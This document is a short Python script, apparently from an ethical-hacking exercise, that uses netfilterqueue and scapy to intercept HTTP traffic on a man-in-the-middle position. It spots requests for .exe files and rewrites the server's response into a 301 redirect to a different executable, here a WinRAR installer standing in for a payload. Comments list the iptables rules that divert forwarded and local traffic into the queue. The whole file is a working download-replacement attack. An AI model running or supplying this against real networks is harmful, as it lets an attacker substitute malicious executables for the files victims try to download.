#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):

    packet[scapy.Raw].load = load
    # print(scapy_packet.show())

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet
def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):

        if scapy_packet[scapy.TCP].dport == 80:
            #print("HTTP Request")
            if ".exe" in str(scapy_packet[scapy.Raw].load):
                print("exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                #print(scapy_packet.show())

        elif scapy_packet[scapy.TCP].sport == 80:
            #print("HTTP Response")
            if scapy_packet[scapy.TCP].seq  in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] replacing file")
                #scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x32-611.exe\n\n"
                modified_packet = set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/winrar-x32-611.exe\n\n")
                #print(scapy_packet.show())
                # del scapy_packet[scapy.IP].len
                # del scapy_packet[scapy.IP].chksum
                # del scapy_packet[scapy.TCP].chksum

                packet.set_payload(bytes(modified_packet))
                # packet.set_payload(str(scapy_packet)) for python2


    packet.accept()

queue = netfilterqueue.NetfilterQueue()

queue.bind(0 , process_packet)

queue.run()

# iptables -I FORWARD -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0

#http://www.lancsngfl.ac.uk/cmsmanual/index.php?category_id=14
#https://www.rarlab.com/download.htm
#speedbit.com